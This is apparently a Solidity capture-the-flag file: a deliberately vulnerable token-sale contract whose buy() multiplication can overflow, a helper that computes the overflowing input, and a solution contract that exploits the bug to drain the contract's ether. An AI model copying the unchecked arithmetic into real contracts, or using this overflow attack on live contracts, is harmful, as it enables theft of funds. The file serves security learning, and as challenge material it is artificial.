pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract OverflowTest {
    function getMaxUint256() public pure returns(uint256) {
        return 2**256 - 1;
    }

    function getMaxPossibleCount() public pure returns (uint256) {
        return uint256(2**256 - 1) / uint256(10 ** 18);
    }

    function getInput(uint256 _input) public pure returns (uint256) {
        return _input * (10 ** 18);
    }

    function getFinalInput() public pure returns(uint256) {
        return (uint256(2**256 - 1) / uint256(10 ** 18) + uint256(1));
    }

    function getFinalTokenCount() public pure returns(uint256) {
        return (uint256(2**256 - 1) / uint256(10 ** 18) + uint256(1)) * uint(1e18);
    }
}

contract TokenSaleSolution {
    function TokenSaleSolution(address _challenge, uint256 numToken) public payable {
        TokenSaleChallenge challenge = TokenSaleChallenge(_challenge);
        require(msg.value == numToken * 1 ether);
        challenge.buy.value(msg.value)(numToken);
        challenge.sell(uint256(1));
        require(address(this).balance == 1 ether);
        msg.sender.transfer(1 ether);
    }

    function ()
    public
    payable {
        
    }
}